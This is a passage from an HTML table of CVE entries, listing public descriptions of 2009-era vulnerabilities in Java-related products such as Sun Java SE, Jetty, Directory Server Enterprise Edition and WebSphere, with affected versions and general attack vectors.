		<td valign="top">Mort Bay Jetty 6.x through 6.1.22 and 7.0.0 writes backtrace data without sanitizing non-printable characters, which might allow remote attackers to modify a window's title, or possibly execute arbitrary commands or overwrite files, via an HTTP request containing an escape sequence for a terminal emulator, related to (1) a string value in the Age parameter to the default URI for the Cookie Dump Servlet in test-jetty-webapp/src/main/java/com/acme/CookieDump.java under cookie/, (2) an alphabetic value in the A parameter to jsp/expr.jsp, or (3) an alphabetic value in the Content-Length HTTP header to an arbitrary application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4443">CVE-2009-4443</a></td>
		<td valign="top">Unspecified vulnerability in the psearch (aka persistent search) functionality in Directory Proxy Server (DPS) in Sun Java System Directory Server Enterprise Edition 6.0 through 6.3.1 allows remote attackers to cause a denial of service (psearch outage) by using a crafted psearch client to send requests that trigger a psearch thread loop, aka Bug Id 6855978.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4442">CVE-2009-4442</a></td>
		<td valign="top">Directory Proxy Server (DPS) in Sun Java System Directory Server Enterprise Edition 6.0 through 6.3.1 does not properly implement the max-client-connections configuration setting, which allows remote attackers to cause a denial of service (connection slot exhaustion) by making multiple connections and performing no operations on these connections, aka Bug Id 6648665.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4441">CVE-2009-4441</a></td>
		<td valign="top">Directory Proxy Server (DPS) in Sun Java System Directory Server Enterprise Edition 6.0 through 6.3.1 does not enable the SO_KEEPALIVE socket option, which makes it easier for remote attackers to cause a denial of service (connection slot exhaustion) via multiple connections, aka Bug Id 6782659.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4440">CVE-2009-4440</a></td>
		<td valign="top">Directory Proxy Server (DPS) in Sun Java System Directory Server Enterprise Edition 6.0 through 6.3.1 does not properly handle multiple client connections within a short time window, which allows remote attackers to hijack the backend connection of an authenticated user, and obtain the privileges of this user, by making a client connection in opportunistic circumstances, related to "long binds," aka Bug Ids 6828462 and 6823593.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4211">CVE-2009-4211</a></td>
		<td valign="top">The U.S. Defense Information Systems Agency (DISA) Security Readiness Review (SRR) script for the Solaris x86 platform executes files in arbitrary directories as root for filenames equal to (1) java, (2) openssl, (3) php, (4) snort, (5) tshark, (6) vncserver, or (7) wireshark, which allows local users to gain privileges via a Trojan horse program.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4187">CVE-2009-4187</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the Gateway component in Sun Java System Portal Server 6.3.1, 7.1, and 7.2 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4139">CVE-2009-4139</a></td>
		<td valign="top">Cross-site request forgery (CSRF) vulnerability in the Spacewalk Java site packages (aka spacewalk-java) 1.2.39 in Spacewalk, as used in the server in Red Hat Network Satellite 5.3.0 through 5.4.1 and other products, allows remote attackers to hijack the authentication of arbitrary users for requests that (1) disable the current user account, (2) add user accounts, or (3) modify user accounts to have administrator privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4052">CVE-2009-4052</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the JSF Widget Library Runtime in IBM Rational Application Developer for WebSphere Software before 7.0.0.10 and Rational Software Architect before 7.0.0.10 allow remote attackers to inject arbitrary web script or HTML via vectors involving (1) the JSF Tree Control and (2) the JavaScript Resource Servlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3936">CVE-2009-3936</a></td>
		<td valign="top">Unspecified vulnerability in Citrix Online Plug-in for Windows 11.0.x before 11.0.150 and 11.x before 11.2, Online Plug-in for Mac before 11.0, Receiver for iPhone before 1.0.3, and ICA Java, Mac, UNIX, and Windows Clients for XenApp and XenDesktop allows remote attackers to impersonate the SSL/TLS server and bypass authentication via a crafted certificate, a different vulnerability than CVE-2009-3555.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3886">CVE-2009-3886</a></td>
		<td valign="top">The Java Web Start implementation in Sun Java SE 6 before Update 17 does not properly handle the interaction between a signed JAR file and a JNLP (1) application or (2) applet, which has unspecified impact and attack vectors, related to a "regression," aka Bug Id 6870531.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3885">CVE-2009-3885</a></td>
		<td valign="top">Sun Java SE 5.0 before Update 22 and 6 before Update 17 on Windows allows remote attackers to cause a denial of service via a BMP file containing a link to a UNC share pathname for an International Color Consortium (ICC) profile file, probably a related issue to CVE-2007-2789, aka Bug Id 6632445.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3884">CVE-2009-3884</a></td>
		<td valign="top">The TimeZone.getTimeZone method in Sun Java SE 5.0 before Update 22 and 6 before Update 17, and OpenJDK, allows remote attackers to determine the existence of local files via vectors related to handling of zoneinfo (aka tz) files, aka Bug Id 6824265.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3883">CVE-2009-3883</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the Windows Pluggable Look and Feel (PL&amp;F) feature in the Swing implementation in Sun Java SE 5.0 before Update 22 and 6 before Update 17, and OpenJDK, have unknown impact and remote attack vectors, related to "information leaks in mutable variables," aka Bug Id 6657138.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3882">CVE-2009-3882</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the Swing implementation in Sun Java SE 5.0 before Update 22 and 6 before Update 17, and OpenJDK, have unknown impact and remote attack vectors, related to "information leaks in mutable variables," aka Bug Id 6657026.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3881">CVE-2009-3881</a></td>
		<td valign="top">Sun Java SE 5.0 before Update 22 and 6 before Update 17, and OpenJDK, does not prevent the existence of children of a resurrected ClassLoader, which allows remote attackers to gain privileges via unspecified vectors, related to an "information leak vulnerability," aka Bug Id 6636650.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3880">CVE-2009-3880</a></td>
		<td valign="top">The Abstract Window Toolkit (AWT) in Java Runtime Environment (JRE) in Sun Java SE 5.0 before Update 22 and 6 before Update 17, and OpenJDK, does not properly restrict the objects that may be sent to loggers, which allows attackers to obtain sensitive information via vectors related to the implementation of Component, KeyboardFocusManager, and DefaultKeyboardFocusManager, aka Bug Id 6664512.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3879">CVE-2009-3879</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the (1) X11 and (2) Win32GraphicsDevice subsystems in Sun Java SE 5.0 before Update 22 and 6 before Update 17, and OpenJDK, have unknown impact and attack vectors, related to failure to clone arrays that are returned by the getConfigurations function, aka Bug Id 6822057.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3878">CVE-2009-3878</a></td>
		<td valign="top">Buffer overflow in Sun Java System Web Server 7.0 Update 6 has unspecified impact and remote attack vectors, as demonstrated by the vd_sjws module in VulnDisco Pack Professional 8.12.  NOTE: as of 20091105, this disclosure has no actionable information. However, because the VulnDisco Pack author is a reliable researcher, the issue is being assigned a CVE identifier for tracking purposes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3877">CVE-2009-3877</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to cause a denial of service (memory consumption) via crafted HTTP headers, which are not properly parsed by the ASN.1 DER input stream parser, aka Bug Id 6864911.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3876">CVE-2009-3876</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to cause a denial of service (memory consumption) via crafted DER encoded data, which is not properly decoded by the ASN.1 DER input stream parser, aka Bug Id 6864911.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3875">CVE-2009-3875</a></td>
		<td valign="top">The MessageDigest.isEqual function in Java Runtime Environment (JRE) in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to spoof HMAC-based digital signatures, and possibly bypass authentication, via unspecified vectors related to "timing attack vulnerabilities," aka Bug Id 6863503.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3874">CVE-2009-3874</a></td>
		<td valign="top">Integer overflow in the JPEGImageReader implementation in the ImageI/O component in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to execute arbitrary code via large subsample dimensions in a JPEG file that triggers a heap-based buffer overflow, aka Bug Id 6874643.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3873">CVE-2009-3873</a></td>
		<td valign="top">The JPEG Image Writer in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to gain privileges via a crafted image file, related to a "quantization problem," aka Bug Id 6862968.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3872">CVE-2009-3872</a></td>
		<td valign="top">Unspecified vulnerability in the JPEG JFIF Decoder in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to gain privileges via a crafted image file, aka Bug Id 6862969.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3871">CVE-2009-3871</a></td>
		<td valign="top">Heap-based buffer overflow in the setBytePixels function in the Abstract Window Toolkit (AWT) in Java Runtime Environment (JRE) in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to execute arbitrary code via crafted arguments, aka Bug Id 6872358.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3869">CVE-2009-3869</a></td>
		<td valign="top">Stack-based buffer overflow in the setDiffICM function in the Abstract Window Toolkit (AWT) in Java Runtime Environment (JRE) in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to execute arbitrary code via a crafted argument, aka Bug Id 6872357.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3868">CVE-2009-3868</a></td>
		<td valign="top">Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 does not properly parse color profiles, which allows remote attackers to gain privileges via a crafted image file, aka Bug Id 6862970.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3867">CVE-2009-3867</a></td>
		<td valign="top">Stack-based buffer overflow in the HsbParser.getSoundBank function in Sun Java SE in JDK and JRE 5.0 before Update 22, JDK and JRE 6 before Update 17, SDK and JRE 1.3.x before 1.3.1_27, and SDK and JRE 1.4.x before 1.4.2_24 allows remote attackers to execute arbitrary code via a long file: URL in an argument, aka Bug Id 6854303.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3866">CVE-2009-3866</a></td>
		<td valign="top">The Java Web Start Installer in Sun Java SE in JDK and JRE 6 before Update 17 does not properly use security model permissions when removing installer extensions, which allows remote attackers to execute arbitrary code by modifying a certain JNLP file to have a URL field that points to an unintended trusted application, aka Bug Id 6872824.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3865">CVE-2009-3865</a></td>
		<td valign="top">The launch method in the Deployment Toolkit plugin in Java Runtime Environment (JRE) in Sun Java SE in JDK and JRE 6 before Update 17 allows remote attackers to execute arbitrary commands via a crafted web page, aka Bug Id 6869752.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3864">CVE-2009-3864</a></td>
		<td valign="top">The Java Update functionality in Java Runtime Environment (JRE) in Sun Java SE in JDK and JRE 5.0 before Update 22 and JDK and JRE 6 before Update 17, when a non-English version of Windows is used, does not retrieve available new JRE versions, which allows remote attackers to leverage vulnerabilities in older releases of this software, aka Bug Id 6869694.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3852">CVE-2009-3852</a></td>
		<td valign="top">Unspecified vulnerability in the XML component in IBM Runtimes for Java Technology 5.0.0 before SR10 has unknown impact and attack vectors, related to the "updated version of XML4J 4.4.17."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3729">CVE-2009-3729</a></td>
		<td valign="top">Unspecified vulnerability in the TrueType font parsing functionality in Sun Java SE 5.0 before Update 22 and 6 before Update 17 allows remote attackers to cause a denial of service (application crash) via a certain test suite, aka Bug Id 6815780.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3728">CVE-2009-3728</a></td>
		<td valign="top">Directory traversal vulnerability in the ICC_Profile.getInstance method in Java Runtime Environment (JRE) in Sun Java SE 5.0 before Update 22 and 6 before Update 17, and OpenJDK, allows remote attackers to determine the existence of local International Color Consortium (ICC) profile files via a .. (dot dot) in a pathname, aka Bug Id 6631533.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-3068">CVE-2009-3068</a></td>
		<td valign="top">Unrestricted file upload vulnerability in the RoboHelpServer Servlet (robohelp/server) in Adobe RoboHelp Server 8 allows remote attackers to execute arbitrary code by uploading a Java Archive (.jsp) file during a PUBLISH action, then accessing it via a direct request to the file in the robohelp/robo/reserved/web directory under its sessionid subdirectory, as demonstrated by the vd_adobe module in VulnDisco Pack Professional 8.7 through 8.11.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2932">CVE-2009-2932</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in uddiclient/process in the UDDI client in SAP NetWeaver Application Server (Java) 7.0 allows remote attackers to inject arbitrary web script or HTML via the TModel Key field.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2843">CVE-2009-2843</a></td>
		<td valign="top">Java for Mac OS X 10.5 before Update 6 and 10.6 before Update 1 accepts expired certificates for applets, which makes it easier for remote attackers to execute arbitrary code via an applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2747">CVE-2009-2747</a></td>
		<td valign="top">The Java Naming and Directory Interface (JNDI) implementation in IBM WebSphere Application Server (WAS) 6.0 before 6.0.2.39, 6.1 before 6.1.0.29, and 7.0 before 7.0.0.7 does not properly restrict access to UserRegistry object methods, which allows remote attackers to obtain sensitive information via a crafted method call.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2724">CVE-2009-2724</a></td>
		<td valign="top">Race condition in the java.lang package in Sun Java SE 5.0 before Update 20 has unknown impact and attack vectors, related to a "3Y Race condition in reflection checks."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2723">CVE-2009-2723</a></td>
		<td valign="top">Unspecified vulnerability in deserialization in the Provider class in Sun Java SE 5.0 before Update 20 has unknown impact and attack vectors, aka BugId 6444262.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2722">CVE-2009-2722</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the Provider class in Sun Java SE 5.0 before Update 20 have unknown impact and attack vectors, aka BugId 6429594.  NOTE: this issue exists because of an incorrect fix for BugId 6406003.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2721">CVE-2009-2721</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in the Provider class in Sun Java SE 5.0 before Update 20 have unknown impact and attack vectors, aka BugId 6406003.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2720">CVE-2009-2720</a></td>
		<td valign="top">Unspecified vulnerability in the javax.swing.plaf.synth.SynthContext.isSubregion method in the Swing implementation in Sun Java SE 6 before Update 15 allows context-dependent attackers to cause a denial of service (NullPointerException in the Jemmy library) via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2719">CVE-2009-2719</a></td>
		<td valign="top">The Java Web Start implementation in Sun Java SE 6 before Update 15 allows context-dependent attackers to cause a denial of service (NullPointerException) via a crafted .jnlp file, as demonstrated by the jnlp_file/appletDesc/index.html#misc test in the Technology Compatibility Kit (TCK) for the Java Network Launching Protocol (JNLP).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2718">CVE-2009-2718</a></td>
		<td valign="top">The Abstract Window Toolkit (AWT) implementation in Sun Java SE 6 before Update 15 on X11 does not impose the intended constraint on distance from the window border to the Security Warning Icon, which makes it easier for context-dependent attackers to trick a user into interacting unsafely with an untrusted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2717">CVE-2009-2717</a></td>
		<td valign="top">The Abstract Window Toolkit (AWT) implementation in Sun Java SE 6 before Update 15 on Windows 2000 Professional does not provide a Security Warning Icon, which makes it easier for context-dependent attackers to trick a user into interacting unsafely with an untrusted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2716">CVE-2009-2716</a></td>
		<td valign="top">The plugin functionality in Sun Java SE 6 before Update 15 does not properly implement version selection, which allows context-dependent attackers to leverage vulnerabilities in "old zip and certificate handling" and have unspecified other impact via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2713">CVE-2009-2713</a></td>
		<td valign="top">The CDCServlet component in Sun Java System Access Manager 7.0 2005Q4 and 7.1, when Cross Domain Single Sign On (CDSSO) is enabled, does not ensure that "policy advice" is presented to the correct client, which allows remote attackers to obtain sensitive information via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2712">CVE-2009-2712</a></td>
		<td valign="top">Sun Java System Access Manager 6.3 2005Q1, 7.0 2005Q4, and 7.1; and OpenSSO Enterprise 8.0; when AMConfig.properties enables the debug flag, allows local users to discover cleartext passwords by reading debug files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2690">CVE-2009-2690</a></td>
		<td valign="top">The encoder in Sun Java SE 6 before Update 15, and OpenJDK, grants read access to private variables with unspecified names, which allows context-dependent attackers to obtain sensitive information via an untrusted (1) applet or (2) application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2689">CVE-2009-2689</a></td>
		<td valign="top">JDK13Services.getProviders in Sun Java SE 5.0 before Update 20 and 6 before Update 15, and OpenJDK, grants full privileges to instances of unspecified object types, which allows context-dependent attackers to bypass intended access restrictions via an untrusted (1) applet or (2) application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2676">CVE-2009-2676</a></td>
		<td valign="top">Unspecified vulnerability in JNLPAppletlauncher in Sun Java SE, and SE for Business, in JDK and JRE 6 Update 14 and earlier and JDK and JRE 5.0 Update 19 and earlier; and Java SE for Business in SDK and JRE 1.4.2_21 and earlier; allows remote attackers to create or modify arbitrary files via vectors involving an untrusted Java applet that accesses an old version of JNLPAppletLauncher.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2675">CVE-2009-2675</a></td>
		<td valign="top">Integer overflow in the unpack200 utility in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15, and JDK and JRE 5.0 before Update 20, allows context-dependent attackers to gain privileges via unspecified length fields in the header of a Pack200-compressed JAR file, which leads to a heap-based buffer overflow during decompression.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2674">CVE-2009-2674</a></td>
		<td valign="top">Integer overflow in javaws.exe in Sun Java Web Start in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15 allows context-dependent attackers to execute arbitrary code via a crafted JPEG image that is not properly handled during display to a splash screen, which triggers a heap-based buffer overflow.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2673">CVE-2009-2673</a></td>
		<td valign="top">The proxy mechanism implementation in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15, and JDK and JRE 5.0 before Update 20, allows remote attackers to bypass intended access restrictions and connect to arbitrary sites via unspecified vectors, related to a declaration that lacks the final keyword.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2672">CVE-2009-2672</a></td>
		<td valign="top">The proxy mechanism implementation in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15, and JDK and JRE 5.0 before Update 20, does not prevent access to browser cookies by untrusted (1) applets and (2) Java Web Start applications, which allows remote attackers to hijack web sessions via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2671">CVE-2009-2671</a></td>
		<td valign="top">The SOCKS proxy implementation in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15, and JDK and JRE 5.0 before Update 20, allows remote attackers to discover the username of the account that invoked an untrusted (1) applet or (2) Java Web Start application via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2670">CVE-2009-2670</a></td>
		<td valign="top">The audio system in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15, and JDK and JRE 5.0 before Update 20, does not prevent access to java.lang.System properties by (1) untrusted applets and (2) Java Web Start applications, which allows context-dependent attackers to obtain sensitive information by reading these properties.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2625">CVE-2009-2625</a></td>
		<td valign="top">XMLScanner.java in Apache Xerces2 Java, as used in Sun Java Runtime Environment (JRE) in JDK and JRE 6 before Update 15 and JDK and JRE 5.0 before Update 20, and in other products, allows remote attackers to cause a denial of service (infinite loop and application hang) via malformed XML input, as demonstrated by the Codenomicon XML fuzzing framework.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2597">CVE-2009-2597</a></td>
		<td valign="top">The Sun Java System (SJS) Access Manager Policy Agent module 2.2 for SJS Web Proxy Server 4.0 allows remote attackers to cause a denial of service (daemon crash) via a GET request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2582">CVE-2009-2582</a></td>
		<td valign="top">Stack-based buffer overflow in manager.exe in Akamai Download Manager (aka DLM or dlmanager) before 2.2.4.8 allows remote web servers to execute arbitrary code via a malformed HTTP response during a Redswoosh download, a different vulnerability than CVE-2007-1891 and CVE-2007-1892.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2476">CVE-2009-2476</a></td>
		<td valign="top">The Java Management Extensions (JMX) implementation in Sun Java SE 6 before Update 15, and OpenJDK, does not properly enforce OpenType checks, which allows context-dependent attackers to bypass intended access restrictions by leveraging finalizer resurrection to obtain a reference to a privileged object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2475">CVE-2009-2475</a></td>
		<td valign="top">Sun Java SE 5.0 before Update 20 and 6 before Update 15, and OpenJDK, might allow context-dependent attackers to obtain sensitive information via vectors involving static variables that are declared without the final keyword, related to (1) LayoutQueue, (2) Cursor.predefined, (3) AccessibleResourceBundle.getContents, (4) ImageReaderSpi.STANDARD_INPUT_TYPE, (5) ImageWriterSpi.STANDARD_OUTPUT_TYPE, (6) the imageio plugins, (7) DnsContext.debug, (8) RmfFileReader/StandardMidiFileWriter.types, (9) AbstractSaslImpl.logger, (10) Synth.Region.uiToRegionMap/lowerCaseNameMap, (11) the Introspector class and a cache of BeanInfo, and (12) JAX-WS, a different vulnerability than CVE-2009-2673.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2445">CVE-2009-2445</a></td>
		<td valign="top">Oracle iPlanet Web Server (formerly Sun Java System Web Server or Sun ONE Web Server) 6.1 before SP12, and 7.0 through Update 6, when running on Windows, allows remote attackers to read arbitrary JSP files via an alternate data stream syntax, as demonstrated by a .jsp::$DATA URI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2283">CVE-2009-2283</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the help jsp scripts in Sun Java Web Console 3.0.2 through 3.0.5, and Sun Java Web Console in Solaris 10, allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2268">CVE-2009-2268</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the Cross-Domain Controller (CDC) servlet in Sun Java System Access Manager 6 2005Q1, 7 2005Q4, and 7.1 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2205">CVE-2009-2205</a></td>
		<td valign="top">Stack-based buffer overflow in the Java Web Start command launcher in Java for Mac OS X 10.5 before Update 5 allows attackers to execute arbitrary code or cause a denial of service (application crash) via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-2090">CVE-2009-2090</a></td>
		<td valign="top">Unspecified vulnerability in wsadmin in the System Management/Repository component in IBM WebSphere Application Server (WAS) 7.0 before 7.0.0.5 allows remote attackers to bypass intended Java Management Extensions (JMX) Management Beans (aka MBeans) access restrictions, and cause a denial of service (daemon stop), via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1934">CVE-2009-1934</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the Reverse Proxy Plug-in in Sun Java System Web Server 6.1 before SP11 allows remote attackers to inject arbitrary web script or HTML via the query string in situations that result in a 502 Gateway error.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1896">CVE-2009-1896</a></td>
